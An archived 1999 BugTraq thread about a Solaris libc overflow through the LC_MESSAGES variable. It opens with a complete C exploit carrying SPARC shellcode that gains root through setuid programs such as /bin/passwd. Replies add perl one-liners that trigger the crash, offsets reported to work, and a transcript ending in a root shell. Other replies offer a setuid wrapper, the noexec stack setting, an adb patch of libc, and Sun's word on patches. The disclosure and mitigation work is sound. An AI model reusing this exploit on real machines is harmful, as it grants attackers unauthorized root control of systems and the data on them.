Date: Sat, 22 May 1999 03:47:02 +0900
From: "UNYUN@ShadowPenguinSecurity" <unyun@MAIL.GOO.NE.JP>
To: BUGTRAQ@netspace.org
Subject: Solaris libc exploit

Hello.

libc overflows when that handles LC_MESSAGES.
So, If you set the long string to LC_MESSAGES and call
/bin/sh, the core file is dumped.
This is serious problem.

The long string that contains the exploit code is set to
LC_MESSAGES and called suid program by execl(), local user
can get the root privilege. The called suid program have
not to contain the overflow bugs.
I confirmed this bug on Solaris2.6 and Solaris7.
Solaris2.4, 2.5 does not contain this bug.

The following program is an example to get root privilege.
This is tested on Solaris2.6 for Sparc edition.
This program calls "/bin/passwd", but you can also specify
other  suid programs such as "/bin/su" or "/bin/rsh".


/*============================================================
   ex_lobc.c Overflow Exploits( for Sparc Edition)
   The Shadow Penguin Security
   (http://base.oc.to:/skyscraper/byte/551)
   Written by UNYUN (unewn4th@usa.net)
  ============================================================
*/
#define EV          "LC_MESSAGES="
#define ADJUST      0
#define OFFSET      5392
#define STARTADR    400
#define NOP         0xa61cc013
#define RETS        600

char    x[80000];

char exploit_code[] =
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2b\x0b\xda\xdc\xae\x15\x63\x68"
"\x90\x0b\x80\x0e\x92\x03\xa0\x0c"
"\x94\x10\x20\x10\x94\x22\xa0\x10"
"\x9c\x03\xa0\x14"
"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08"
;

unsigned long get_sp(void)
{
__asm__("mov %sp,%i0 \n");
}

int i;
unsigned int ret_adr;

main()
{
    putenv("LANG=");
    memset(x,'x',70000);

    for (i = 0; i < ADJUST; i++) x[i]=0x40;
    for (i = ADJUST; i < 1000; i+=4){
        x[i+3]=NOP & 0xff;
        x[i+2]=(NOP >> 8 ) &0xff;
        x[i+1]=(NOP >> 16 ) &0xff;
        x[i+0]=(NOP >> 24 ) &0xff;
    }
    for (i=0;i<strlen(exploit_code);i++) x[STARTADR+i+ADJUST]=exploit_code[i];
    ret_adr=get_sp()-OFFSET;
    printf("jumping address : %lx\n",ret_adr);
    if ((ret_adr & 0xff) ==0 ){
        ret_adr -=16;
        printf("New jumping address : %lx\n",ret_adr);
    }
    for (i = ADJUST+RETS; i < RETS+600; i+=4){
        x[i+3]=ret_adr & 0xff;
        x[i+2]=(ret_adr >> 8 ) &0xff;
        x[i+1]=(ret_adr >> 16 ) &0xff;
        x[i+0]=(ret_adr >> 24 ) &0xff;
    }
    memcpy(x,EV,strlen(EV));
    x[3000]=0;
    putenv(x);
    execl("/bin/passwd","passwd",(char *)0);
}


---
The Shadow Penguin Security : http://base.oc.to/skyscraper/byte/551
Webmaster : UNYUN (unewn4th@usa.net)

---------------------------------------------------------------------------

Date: Sat, 22 May 1999 17:26:47 +0200
From: Oystein Viggen <oysteivi@TIHLDE.ORG>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

On Sat, 22 May 1999, UNYUN@ShadowPenguinSecurity wrote:

> Hello.
>
> libc overflows when that handles LC_MESSAGES.
> So, If you set the long string to LC_MESSAGES and call
> /bin/sh, the core file is dumped.
> This is serious problem.
>
> The long string that contains the exploit code is set to
> LC_MESSAGES and called suid program by execl(), local user
> can get the root privilege. The called suid program have
> not to contain the overflow bugs.
> I confirmed this bug on Solaris2.6 and Solaris7.
> Solaris2.4, 2.5 does not contain this bug.

Didn't work on my Solaris2.6/sparc box.
It just said "Illegal instruction" when using /bin/passwd and segfaulted
when using /bin/su.

Oystein
---
"The only way of discovering the limits of the possible
is to venture a little way past them into the impossible."
- Arthur C. Clarke

---------------------------------------------------------------------------

Date: Sun, 23 May 1999 15:43:54 +0200
From: M.C.Mar <woloszyn@it.pl>
Reply-To: M.C.Mar <emsi@it.pl>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

On Sat, 22 May 1999, UNYUN@ShadowPenguinSecurity wrote:

> Hello.
>
> libc overflows when that handles LC_MESSAGES.
> So, If you set the long string to LC_MESSAGES and call
> /bin/sh, the core file is dumped.
> This is serious problem.
>
Well...
$ setenv LC_MESSAGES `perl -e 'print "A"x1024'`
$ /bin/sh
couldn't set locale correctly
$ uname -a
SunOS XXXXXX 5.6 Generic_105181-07 sun4u sparc SUNW,Ultra-4

> The long string that contains the exploit code is set to
> LC_MESSAGES and called suid program by execl(), local user
> can get the root privilege. The called suid program have
> not to contain the overflow bugs.
> I confirmed this bug on Solaris2.6 and Solaris7.
> Solaris2.4, 2.5 does not contain this bug.
>
Do I need to call it directly by execl???

> The following program is an example to get root privilege.
> This is tested on Solaris2.6 for Sparc edition.
> This program calls "/bin/passwd", but you can also specify
> other  suid programs such as "/bin/su" or "/bin/rsh".
>

$ traceroute
Error: Aborting!
 Excessive environment variable length:
'LC_MESSAGES=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

Seems like universal wrapper...
Any details? Did I missed something?

--
___________________________________________________________________________
M.C.Mar   An NT server can be run by an idiot, and usually is.   emsi@it.pl
      "If you can't make it good, make it LOOK good." - Bill Gates
   Those who do not understand Unix are condemned to reinvent it, poorly.
            - Henry Spencer, University of Toronto Unix hack

---------------------------------------------------------------------------

Date: Sun, 23 May 1999 19:06:28 +0200
From: GOMBAS Gabor <gombasg@VALERIE.INF.ELTE.HU>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

Hello,

The exploit works for Solaris2.6/sun4u. With Solaris7/sun4m, it gives
"Illegal instruction". Maybe your exploit is using Ultrasparc-specific
instructions?

Gabor

---
Gabor Gombas                                       Eotvos Lorand University
E-mail: gombasg@inf.elte.hu                        Hungary

---------------------------------------------------------------------------

Date: Mon, 24 May 1999 02:15:27 +0900
From: "UNYUN@ShadowPenguinSecurity" <unyun@MAIL.GOO.NE.JP>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

    [ The following text is in the "iso-2022-jp" character set. ]
    [ Your display is set for the "US-ASCII" character set.  ]
    [ Some characters may be displayed incorrectly. ]

Hi,

> $ setenv LC_MESSAGES `perl -e 'print "A"x1024'`
You have to set more long string to LC_MESSAGES
If you are using /bin/sh....

host% /bin/sh
$ LC_MESSAGES=`perl -e 'print "A"x5000'`
Bus error
host%




---
The Shadow Penguin Security : http://base.oc.to/skyscraper/byte/551
Webmaster : UNYUN (unewn4th@usa.net)

---------------------------------------------------------------------------

Date: Sun, 23 May 1999 14:00:52 -0500
From: Craig Johnston <caj@LFN.ORG>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

On Sat, 22 May 1999, Oystein Viggen wrote:

> On Sat, 22 May 1999, UNYUN@ShadowPenguinSecurity wrote:
>
> > libc overflows when that handles LC_MESSAGES.
> > So, If you set the long string to LC_MESSAGES and call
> > /bin/sh, the core file is dumped.
> > This is serious problem.
>
> Didn't work on my Solaris2.6/sparc box.
> It just said "Illegal instruction" when using /bin/passwd and segfaulted
> when using /bin/su.

My guess is that this is architecture-dependent.  It works on my sun4m
boxes and not the ultrasparcs.  It looks like it could be made to work
with some tweaking if you can get a SIGILL.  I'd assume the script
kiddies have one that works on your platform.

This is a really bad one.  Here's my ugly temporary fix:

Make a directory, /subin, and move all setuid root binaries into it.
Remove the setuid bits.  Compile the following c program and put it
in place of the old setuid root binaries, with the setuid bit set.

I spent a small amount of time on this, so it itself may be exploitable.
Use with caution.

--- cut here ---
#include <stdio.h>
#define MAX_ENV 255
#define HOLDING_PEN "/subin/"
#define BSIZE 1024

/*
   quick and dirty wrapper to defeat overflowing of libraries with
   environment variables
   5/99, Craig Johnston, caj@lfn.org
   this comes with no guarantees except "it seems to work here."

   When is security going to become a priority at Sun?
*/

int main(int argc, char **argv, char **envp)
{
    char *p, *q, buf[BSIZE];
    int  i;

    while (*envp) {         /* whack off long env variables */
        for (p = *envp, i = 0; *p ; ++p, ++i)
            if (i >= MAX_ENV) {
                *p = '\0';
                break;
            }
        ++envp;
    }
    for (p = q = argv[0]; *p; ++p)  /* get basename */
        if (*p == '/')
            q = p + 1;

    snprintf(buf, BSIZE, "%s%s", HOLDING_PEN, q);
    execve(buf, argv, envp);
    printf("exec() failed, bailing!\n");
    exit(1);
}

--- cut here ---

--
Craig Johnston
caj@lfn.org

---------------------------------------------------------------------------

Date: Sun, 23 May 1999 20:09:05 -0700
From: Cliff <cliffo@U.WASHINGTON.EDU>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

Works nicely on Solaris7 / sun4u using acpizer's modified source and the
offsets listed...

nowhere:~/temp/crack$ ./a.out 7160
jumping address : ffbedf10,  offset = 7160
# uname -a
SunOS nowhere 5.7 Generic sun4u sparc sun4u
# ls -al /
.
.
.
drwx------  17 root     root        1536 May 23 00:18 root
.
.
.
# cd /root
# pwd
/root
#

---------------------------------------------------------------------------

Date: Mon, 24 May 1999 11:28:03 -0700
From: Aleph One <aleph1@UNDERGROUND.ORG>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

Several people have posted stating that turning off executing on the
stack solves the problem. Folks, just because it stops this exploit
does not mean it stops all exploits. Clever ones will work around
the stack execution issue.

In any case some protection is better than none. So to turn off execution
on the stack in Solaris 2.6 and 7 add the following lines to /etc/system
and restart the system:

* Turn off executable stacks (doesn't work on Solaris x86)
set noexec_user_stack = 1
set noexec_user_stack_log = 1


--
Aleph One / aleph1@underground.org
http://underground.org/
KeyID 1024/948FD6B5
Fingerprint EE C9 E8 AA CB AF 09 61  8C 39 EA 47 A8 6A B8 01

---------------------------------------------------------------------------

Date: Mon, 24 May 1999 22:29:49 +0200
From: Casper Dik <casper@HOLLAND.SUN.COM>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

>Several people have posted stating that turning off executing on the
>stack solves the problem. Folks, just because it stops this exploit
>does not mean it stops all exploits. Clever ones will work around
>the stack execution issue.
>
>In any case some protection is better than none. So to turn off execution
>on the stack in Solaris 2.6 and 7 add the following lines to /etc/system
>and restart the system:
>
>* Turn off executable stacks (doesn't work on Solaris x86)
>set noexec_user_stack = 1
>set noexec_user_stack_log = 1


If you don't scare easily, you may try hacking libc with adb.


THIS IS NOT A SUN SUPPORTED SOLUTION; USE AT YOUR OWN RISK
YOUR SYSTEM MAY BE RENDEDERED INOPERABLE BY FOLLOWING THE INSTRUCTIONS
BELOW


No 100% guarantee either, it seems to work around the problem.

This is a SPARC only solution; perhaps someone can come up with similar
code for IA32.

Before we start to alter the system C library with libc make sure
you have SUNWsutl installed:

        $ pkginfo SUNWsutl; ls -l /usr/sbin/static
        system      SUNWsutl       Static Utilities
        total 4272
        -r-xr-xr-x   3 root     bin       213908 Mar 17 22:56 cp
        -r-xr-xr-x   3 root     bin       213908 Mar 17 22:56 ln
        -r-xr-xr-x   3 root     bin       213908 Mar 17 22:56 mv
        -r-sr-xr-x   1 root     bin       712652 Mar 17 22:58 rcp
        -r-xr-xr-x   1 root     bin       762108 Mar 17 23:00 tar


On quick examination, there appear to be two functions that overflow a
buffer:

        _real_setlocale
        load_all_locales

(You're advised to use a different working copy of libc and only replace
libc carefully when you've tested the resutl using LD_LIBRARY_PATH)

adb -w /lib/libc.so.1

_real_setlocale,100?a^i

(lot of output)

you'll find for other library calls in quick quick succession):

_real_setlocale+0x290:          cmp     %i0, 0x5
_real_setlocale+0x294:          bne,a   _real_setlocale+0x324
_real_setlocale+0x298:          ld      [%i2 + 0x9b0], %o0
_real_setlocale+0x29c:          add     %fp, -0x6b8, %o0
_real_setlocale+0x2a0:          call    _PROCEDURE_LINKAGE_TABLE_+0x2b8 ******
_real_setlocale+0x2a4:          ld      [%i2 + 0x9cc], %o1
_real_setlocale+0x2a8:          add     %fp, -0x6b8, %o0
_real_setlocale+0x2ac:          call    _PROCEDURE_LINKAGE_TABLE_+0x660 ******
_real_setlocale+0x2b0:          mov     %l0, %o1
_real_setlocale+0x2b4:          add     %fp, -0x6b8, %o0
_real_setlocale+0x2b8:          call    _PROCEDURE_LINKAGE_TABLE_+0x660 ******
_real_setlocale+0x2bc:          ld      [%i2 + 0x9d0], %o1
_real_setlocale+0x2c0:          add     %fp, -0x6b8, %o0
_real_setlocale+0x2c4:          call    _PROCEDURE_LINKAGE_TABLE_+0x264 ******
_real_setlocale+0x2c8:          add     %fp, -0x750, %o1
_real_setlocale+0x2cc:          orcc    %g0, %o0, %g0

Change the second call to a nop (a 1 with six 0s):

_real_setlocale+0x2ac?W1000000

Check for nop:

_real_setlocale+0x2ac?i
_real_setlocale+0x2ac:          nop

Similar for load_all_locales:

load_all_locales+0x32c:         st      %o0, [%l0 + 0x4]
load_all_locales+0x330:         ld      [%fp - 0x4c], %o0
load_all_locales+0x334:         cmp     %l2, %o0
load_all_locales+0x338:         bne     load_all_locales+0x3e4
load_all_locales+0x33c:         add     %fp, -0x464, %o0
load_all_locales+0x340:         call    _PROCEDURE_LINKAGE_TABLE_+0x2b8
load_all_locales+0x344:         ld      [%i4 + 0x9d4], %o1
load_all_locales+0x348:         add     %fp, -0x464, %o0
load_all_locales+0x34c:         call    _PROCEDURE_LINKAGE_TABLE_+0x660
load_all_locales+0x350:         ld      [%fp - 0x4], %o1
load_all_locales+0x354:         add     %fp, -0x464, %o0
load_all_locales+0x358:         call    _PROCEDURE_LINKAGE_TABLE_+0x660
load_all_locales+0x35c:         ld      [%i4 + 0x9d8], %o1
load_all_locales+0x360:         add     %fp, -0x464, %o0
load_all_locales+0x364:         call    _PROCEDURE_LINKAGE_TABLE_+0x264
load_all_locales+0x368:         add     %fp, -0x500, %o1
load_all_locales+0x36c:         orcc    %g0, %o0, %g0
load_all_locales+0x370:         bne     load_all_locales+0x390

Nop the second call:

load_all_locales+0x34c?W1000000
load_all_locales+0x34c:         0x40011520      =       0x1000000
?i
load_all_locales+0x34c:         nop


These addresses apply to Solaris 7/SPARC (unpatched), 32 bit libc.


The latest Solaris 2.6/SPARC libc patch differs only a little bit
_real_setlocale+0x2b8, load_all_locales+0x34c

Make sure to test the library before installing it and verify the addresses
accordingly.

To safely replace a library, do this:


        cp modifiedlibc.so.1 /usr/lib/libc.so.1.new
        cd /usr/lib
        ln libc.so.1 libc.so.1.old
        ln libc.so.1.new libc.so.1

Make sure to remove libc.so.1.old or place it outside usr/lib as the runtime
linker can accept it as LD_PRELOAD in which case you'd be back at sq 1.


Casper

---------------------------------------------------------------------------

Date: Tue, 25 May 1999 15:13:17 -0400
From: Doug Granzow <dgranzow@DIGEX.NET>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

>From the testing I've done, the original exploit posted by UNYUN only
works on unpatched 2.6 systems, but acpizer's modification, which allows
you to specify an offset, works on any 2.6 or 2.7 system if you use the
right offset.  I found that using an offset of (I believe) 7144 works on a
2.6 system with patch 105210-19 installed.

Doug


On Tue, 25 May 1999, Wyman Eric Miles wrote:

> Correct me if I'm wrong, but doesn't 105210-06 or higher address this
> under 2.6?  I've been unable to get the exploit to work on any patched
> system, though it works nicely on any architecture I've tried which
> doesn't have the patch.
>
> Wyman

---------------------------------------------------------------------------

Date: Tue, 25 May 1999 20:57:00 +0200
From: Dust <dust@CANNONBALL.DYNDNS.ORG>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

On Tue, May 25, 1999 at 09:30:53AM -0500, Wyman Eric Miles wrote:
> Correct me if I'm wrong, but doesn't 105210-06 or higher address this
> under 2.6?  I've been unable to get the exploit to work on any patched
> system, though it works nicely on any architecture I've tried which
> doesn't have the patch.

According 105210 description:

(from 105210-06)

4118295 LC_* can be used to obtain root access from setuid programs

I've tried to find the referenced bug description, but I wasn't able to
find it on the Sunsolve KB.

--
Tact is the ability to tell a man he has an open mind when he has a
hole in his head.

---------------------------------------------------------------------------

Date: Tue, 25 May 1999 15:21:20 -0400
From: Toby Chappell <sysatc@EVOKEN.GSU.EDU>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

Wyman Eric Miles wrote:
# Correct me if I'm wrong, but doesn't 105210-06 or higher address this
# under 2.6?  I've been unable to get the exploit to work on any patched
# system, though it works nicely on any architecture I've tried which
# doesn't have the patch.
#

 i got it to work using the second version of the exploit (the one that lets
you specify offsets) on a 2.6 box with 105210-10 installed....


toby

--
Toby Chappell                                        Georgia State Univ.
Systems Programmer IV                                   Atlanta, Georgia
tchappell@gsu.edu                                         (404) 651-2639

---------------------------------------------------------------------------

Date: Tue, 25 May 1999 22:37:06 +0200
From: Karsten Thygesen <karthy@KOM.AUC.DK>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

>>>>> "Wyman" == Wyman Eric Miles <wymanm@IS.RICE.EDU> writes:

Wyman> Correct me if I'm wrong, but doesn't 105210-06 or higher
Wyman> address this under 2.6?  I've been unable to get the exploit to
Wyman> work on any patched system, though it works nicely on any
Wyman> architecture I've tried which doesn't have the patch.

No - at least is Solaris-2.6 (E3500) vulnerable with 105210-19 installed.

Karsten

--
M.Sc.E.E, Sys/Net-administrator, BOFH, Aalborg University, Denmark
http://www.kom.auc.dk/~karthy/ for more information.
SunSITE Denmark Manager (http://sunsite.auc.dk/)
# $Id: .signature,v 1.1 1997/06/18 08:30:00 karthy Exp $

---------------------------------------------------------------------------

Date: Wed, 26 May 1999 12:20:03 +0100
From: Peter Harvey Solaris Sustaining Engineering <peter.harvey@UK.Sun.COM>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit

> 4118295 LC_* can be used to obtain root access from setuid programs

This is already fixed in Solaris 7 and the following patches for
Solaris 2.6:

  RELEASE     ARCH  PATCH
  5.6         i386  105211-06
  5.6         sparc 105210-06

The exploit referred to in this thread is in the same area (locales and
environment variables) but is different.

> I've tried to find the referenced bug description, but I wasn't able to
> find it on the Sunsolve KB.

We tend to be cautious about publishing our security bugs.

-- Peter
Sustaining Engineer, Solaris Software, Sun Microsystems
peter.harvey@uk.sun.com

---------------------------------------------------------------------------

Date: Wed, 26 May 1999 21:10:56 +0100
From: Peter Harvey Solaris Sustaining Engineering <peter.harvey@UK.Sun.COM>
To: BUGTRAQ@netspace.org
Subject: Re: Solaris libc exploit  Re: Solaris libc exploit

Ricky,

Excuse my not being clear enough here. A few people have already asked
me about this (to whom I replied individually).

> So 105210 doesn't fix the problem.

The patch I referred to does not fix the current exploit (you are
correct). I think perhaps you misunderstood my email. The bug 4118295 I
referred to is already fixed in the patch as I described.  This current
exploit is new.

I emailed BUGTRAQ to confirm:

        (a) bug 4118295 is different
        (b) bug 4118295 is already fixed
        (c) this exploit is new (and therefore *not* 4118295)

-- Peter

